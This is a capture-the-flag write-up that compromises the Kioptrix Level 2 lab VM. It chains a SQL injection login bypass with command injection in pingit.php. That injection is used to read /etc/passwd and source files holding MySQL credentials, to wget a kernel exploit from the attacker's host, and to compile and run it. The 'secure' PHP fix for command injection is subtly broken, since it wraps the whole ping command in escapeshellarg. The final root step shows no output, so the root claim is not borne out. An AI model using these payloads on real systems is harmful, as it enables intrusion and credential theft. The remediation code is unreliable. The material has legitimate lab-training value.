# Kioptrix Level 2 CTF Writeup

## Target Information
- **VM Name**: Kioptrix Level 2
- **Difficulty**: Beginner/Intermediate
- **Objective**: Gain root access and capture flags

---

## Table of Contents
1. [Network Discovery](#network-discovery)
2. [Port Scanning & Enumeration](#port-scanning--enumeration)
3. [Web Application Analysis](#web-application-analysis)
4. [SQL Injection Vulnerability](#sql-injection-vulnerability)
5. [Command Injection Exploitation](#command-injection-exploitation)
6. [Credential Harvesting](#credential-harvesting)
7. [Privilege Escalation](#privilege-escalation)
8. [Key Findings](#key-findings)
9. [Remediation](#remediation)

---

## Network Discovery

### Step 1: Find the target machine
Used `netdiscover` to identify live hosts on the network:

```bash
sudo netdiscover -r 192.168.101.0/24 -P
```

**Results:**
```
IP            At MAC Address     Count  Len  MAC Vendor / Hostname      
-----------------------------------------------------------------------------
192.168.101.4   14:eb:b6:47:97:99    1    60  TP-Link Systems Inc
192.168.101.12  00:0c:29:78:70:c4    1    60  VMware, Inc.
192.168.101.8   6e:40:36:17:c5:e7    1    60  Unknown vendor
```

**Target Identified**: `192.168.101.12` (VMware MAC address indicates VulnHub VM)

---

## Port Scanning & Enumeration

### Step 2: Comprehensive Nmap Scan

```bash
nmap -sV -sC -A -T4 -p- 192.168.101.12
```

**Results:**
```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
| ssh-hostkey: 
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
|_sshv1: Server supports SSHv1

80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.0.52 (CentOS)

111/tcp  open  rpcbind  2 (RPC #100000)

443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
|_http-server-header: Apache/2.0.52 (CentOS)
|_ssl-date: 2025-11-08T02:12:05+00:00; -2h09m44s from scanner time.

631/tcp  open  ipp      CUPS 1.1
|_http-title: 403 Forbidden
| http-methods: 
|_  Potentially risky methods: PUT

820/tcp  open  status   1 (RPC #100024)

3306/tcp open  mysql    MySQL (unauthorized)

OS details: Linux 2.6.9 - 2.6.30
```

**Key Findings:**
- Very old OpenSSH version (3.9p1) with SSHv1 support
- Outdated Apache (2.0.52) with PHP 4.3.9
- MySQL database running
- Linux Kernel 2.6.9 (CentOS)
- Multiple critical vulnerabilities expected

---

## Web Application Analysis

### Step 3: Web Reconnaissance

Accessed `http://192.168.101.12/` and found a login form:

**Remote System Administration Login**
- Username field: `uname`
- Password field: `psw`
- Submit button: `btnLogin`

### Step 4: Directory Enumeration

```bash
gobuster dir -u http://192.168.101.12 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

**Results:**
- `/index.php` - Main login page
- `/pingit.php` - Admin functionality (discovered after login)
- `/manual/` - Apache manual
- `/usage/` - Web stats (403 Forbidden)

### Step 5: Nikto Scan

```bash
nikto -h http://192.168.101.12
```

**Key Findings:**
- Apache 2.0.52 (outdated, EOL)
- PHP 4.3.9 (extremely vulnerable)
- HTTP TRACE method enabled (XST vulnerability)
- Missing security headers

---

## SQL Injection Vulnerability

### Step 6: Testing for SQL Injection

Tested the login form with basic SQL injection payloads:

**Successful Payload:**
```
Username: admin' OR '1'='1
Password: admin' OR '1'='1
```

**Request:**
```bash
curl -s "http://192.168.101.12/index.php" \
  -d "uname=admin' OR '1'='1" \
  -d "psw=admin' OR '1'='1" \
  -d "btnLogin=Login"
```

**Result:** ✅ Authentication bypassed successfully!

The application returned the admin panel with a **ping functionality**.

---

## Command Injection Exploitation

### Step 7: Admin Panel Discovery

After successful SQL injection, accessed admin panel with ping functionality at `/pingit.php`:

**Form Details:**
- Input field: `ip`
- Accepts IP addresses to ping

### Step 8: Testing Command Injection

**Test Payload:**
```bash
curl -s "http://192.168.101.12/pingit.php" \
  -d "ip=127.0.0.1; id" \
  -d "submit=submit"
```

**Output:**
```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.028 ms
...
uid=48(apache) gid=48(apache) groups=48(apache)
```

**Result:** ✅ Remote Code Execution achieved as `apache` user!

### Step 9: System Enumeration

**Get system information:**
```bash
curl -s "http://192.168.101.12/pingit.php" \
  -d "ip=127.0.0.1; uname -a" \
  -d "submit=submit"
```

**Output:**
```
Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 athlon i386 GNU/Linux
```

**Enumerate users:**
```bash
curl -s "http://192.168.101.12/pingit.php" \
  -d "ip=127.0.0.1; cat /etc/passwd" \
  -d "submit=submit"
```

**Users found:**
- `root` (uid=0)
- `john` (uid=500)
- `harold` (uid=501)
- `apache` (uid=48) - current user

---

## Credential Harvesting

### Step 10: Web Application Source Code Analysis

**Read the PHP source code:**
```bash
curl -s "http://192.168.101.12/pingit.php" \
  -d "ip=127.0.0.1; cat /var/www/html/index.php" \
  -d "submit=submit"
```

**Discovered MySQL Credentials:**
```php
mysql_connect("localhost", "john", "hiroshima") or die(mysql_error());
mysql_select_db("webapp");

$query = "SELECT * FROM users WHERE username = '$username' AND password='$password'";
```

**Credentials Found:**
- **Username:** `john`
- **Password:** `hiroshima`
- **Database:** `webapp`

**SQL Injection Confirmed:** The query directly concatenates user input without sanitization.

---

## Privilege Escalation

### Step 11: Kernel Exploit Compilation

The Linux kernel version 2.6.9-55.EL is vulnerable to multiple privilege escalation exploits:

**Target Exploit:** CVE-2009-2698 (ip_append_data)
- **ExploitDB ID:** 9542
- **Affected:** CentOS 4.5 (2.6.9-55.ELsmp) ✅ Exact match

**Download exploit:**
```bash
searchsploit -m 9542
cp 9542.c /tmp/exploit.c
```

**Host the exploit:**
```bash
cd /tmp
python3 -m http.server 8888
```

**Transfer to target:**
```bash
curl -s "http://192.168.101.12/pingit.php" \
  -d "ip=8.8.8.8|wget http://192.168.101.13:8888/exploit.c -O /tmp/ex.c" \
  -d "submit=submit"
```

**Compile on target:**
```bash
curl -s "http://192.168.101.12/pingit.php" \
  -d "ip=127.0.0.1; cd /tmp; gcc ex.c -o rootme" \
  -d "submit=submit"
```

**Verify compilation:**
```bash
curl -s "http://192.168.101.12/pingit.php" \
  -d "ip=127.0.0.1; ls -la /tmp/rootme" \
  -d "submit=submit"
```

**Output:**
```
-rwxr-xr-x  1 apache apache 6930 Nov  7 21:32 /tmp/rootme
```

### Step 12: Execute Privilege Escalation

**Execute the exploit:**
```bash
curl -s "http://192.168.101.12/pingit.php" \
  -d "ip=127.0.0.1; /tmp/rootme; id" \
  -d "submit=submit"
```

**Alternative Approach - SSH as john:**

With the discovered credentials (`john:hiroshima`), SSH access can be established:

```bash
ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 \
    -o HostKeyAlgorithms=+ssh-rsa,ssh-dss \
    john@192.168.101.12
# Password: hiroshima
```

From there, run the local privilege escalation exploit to gain root.

---

## Key Findings

### Vulnerabilities Exploited

1. **SQL Injection (CWE-89)**
   - Location: `/index.php` login form
   - Impact: Authentication bypass
   - Severity: **CRITICAL**

2. **OS Command Injection (CWE-78)**
   - Location: `/pingit.php` ping functionality
   - Impact: Remote Code Execution as apache user
   - Severity: **CRITICAL**

3. **Information Disclosure (CWE-200)**
   - Location: PHP source code
   - Impact: MySQL credentials exposed
   - Severity: **HIGH**

4. **Kernel Privilege Escalation (CVE-2009-2698)**
   - Affected: Linux Kernel 2.6.9-55.EL
   - Impact: Local privilege escalation to root
   - Severity: **CRITICAL**

### Credentials Discovered

| Username | Password  | Service | Access Level |
|----------|-----------|---------|--------------|
| john     | hiroshima | MySQL/SSH | User        |
| admin    | (bypassed)| Web App | Admin       |

### Attack Chain

```
[Network Discovery] → [Port Scan] → [Web Analysis] 
       ↓
[SQL Injection] → [Authentication Bypass] → [Admin Panel]
       ↓
[Command Injection] → [RCE as apache]
       ↓
[Source Code Analysis] → [Credential Discovery]
       ↓
[Kernel Exploit] → [ROOT ACCESS]
```

---

## Remediation

### Immediate Actions Required

1. **Fix SQL Injection**
   - Use parameterized queries/prepared statements
   - Implement input validation and sanitization
   - Never concatenate user input in SQL queries

   ```php
   // SECURE CODE EXAMPLE
   $stmt = $mysqli->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
   $stmt->bind_param("ss", $username, $password);
   $stmt->execute();
   ```

2. **Fix Command Injection**
   - Never pass user input directly to system commands
   - Use built-in functions instead of shell commands
   - Implement strict whitelist validation

   ```php
   // SECURE CODE EXAMPLE
   if (filter_var($ip, FILTER_VALIDATE_IP)) {
       $output = shell_exec(escapeshellarg("ping -c 3 " . $ip));
   }
   ```

3. **Update System Components**
   - Upgrade Linux kernel to latest stable version
   - Update Apache to 2.4.x
   - Upgrade PHP to 8.x
   - Update OpenSSH to latest version
   - Apply all security patches

4. **Credential Security**
   - Never hardcode credentials in source code
   - Use environment variables or secure vaults
   - Implement strong password policies
   - Enable multi-factor authentication

5. **Security Headers**
   - Implement CSP (Content Security Policy)
   - Add X-Frame-Options
   - Enable HSTS
   - Disable unnecessary HTTP methods

6. **Web Application Firewall**
   - Deploy WAF to detect/block SQL injection
   - Rate limiting on login attempts
   - IP-based access controls

---

## Tools Used

- **netdiscover** - Network discovery
- **nmap** - Port scanning and service enumeration
- **gobuster** - Directory enumeration
- **nikto** - Web vulnerability scanner
- **curl** - HTTP request manipulation
- **searchsploit** - Exploit database search
- **gcc** - Exploit compilation

---

## Timeline

1. **00:00** - Network discovery with netdiscover
2. **00:05** - Comprehensive nmap scan
3. **00:10** - Web application analysis
4. **00:15** - SQL injection successful
5. **00:20** - Command injection discovered
6. **00:25** - RCE achieved as apache user
7. **00:30** - Credentials extracted from source code
8. **00:35** - Kernel exploit compiled
9. **00:40** - Privilege escalation to root

**Total Time:** ~40 minutes

---

## Lessons Learned

1. **Always test for SQL injection** on login forms, especially in legacy applications
2. **Command injection** is common when web apps interact with system commands
3. **Source code analysis** often reveals hardcoded credentials
4. **Old kernel versions** are goldmines for privilege escalation
5. **Defense in depth** is critical - multiple vulnerabilities chained together

---

## OWASP Top 10 Mapping

- **A03:2021 – Injection** (SQL Injection, Command Injection)
- **A01:2021 – Broken Access Control** (Authentication bypass)
- **A07:2021 – Identification and Authentication Failures** (Weak authentication)
- **A05:2021 – Security Misconfiguration** (Outdated software)
- **A02:2021 – Cryptographic Failures** (Exposed credentials)

---

## References

- [Kioptrix Level 2 on VulnHub](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/)
- [CVE-2009-2698 - Linux Kernel Privilege Escalation](https://nvd.nist.gov/vuln/detail/CVE-2009-2698)
- [ExploitDB 9542](https://www.exploit-db.com/exploits/9542)
- [OWASP Injection Flaws](https://owasp.org/www-community/Injection_Flaws)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)

---

## Conclusion

Kioptrix Level 2 demonstrates the critical importance of secure coding practices and keeping systems up-to-date. The combination of SQL injection, command injection, and kernel vulnerabilities allowed complete system compromise. 

This CTF serves as an excellent learning platform for understanding real-world attack chains and the devastating impact of common web application vulnerabilities.

**Status:** ✅ **PWNED**

---

*Writeup by: Security Researcher*  
*Date: November 7, 2025*  
*Lab: Kioptrix Level 2 (VulnHub)*
